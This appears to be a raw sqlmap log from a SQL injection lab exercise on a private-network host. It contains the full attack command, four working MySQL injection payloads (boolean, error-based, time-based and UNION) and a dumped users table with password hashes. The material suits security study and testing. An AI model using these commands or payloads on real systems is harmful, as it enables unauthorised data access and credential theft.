=================================================================================
sqlmap -u "http://192.168.17.134/sqlinjection/example4/?req=username%3d%27hacker%27" -p req --dump --risk=2 --level=3

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for MySQL extending provided level (3) and risk (2) values? [Y/n] n
GET parameter 'req' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
what dictionary do you want to use? 1 (default dictionary)
do you want to use common password suffixes? (slow!) [y/N] n
=================================================================================
sqlmap identified the following injection point(s) with a total of 78 HTTP(s) requests:
---
Parameter: req (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: req=username='hacker' AND 1030=(SELECT (CASE WHEN (1030=1030) THEN 1030 ELSE (SELECT 8316 UNION SELECT 4115) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: req=username='hacker' AND (SELECT 9792 FROM(SELECT COUNT(*),CONCAT(0x7176787171,(SELECT (ELT(9792=9792,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: req=username='hacker' AND (SELECT 5693 FROM (SELECT(SLEEP(5)))nTAr)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: req=username='hacker' UNION ALL SELECT CONCAT(0x7176787171,0x7a794a4d6b4d4b74674368766e434459727676706e47414568706a6f66484a5870586e59545a766a,0x7171707071),NULL,NULL-- -
---
web server operating system: Linux Debian 6 (squeeze)
web application technology: Apache 2.2.16
back-end DBMS: MySQL >= 5.0
Database: sqlinjection_example4
Table: users
[5 entries]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 1ed2b44c2f006040e34205455226e695 | user1    |
| 2  | 1ed2b44c2f006040e34205455226e695 | user2    |
| 3  | 1ed2b44c2f006040e34205455226e695 | user3    |
| 4  | 1ed2b44c2f006040e34205455226e695 | user4    |
| 5  | 1ed2b44c2f006040e34205455226e695 | hacker   |
+----+----------------------------------+----------+

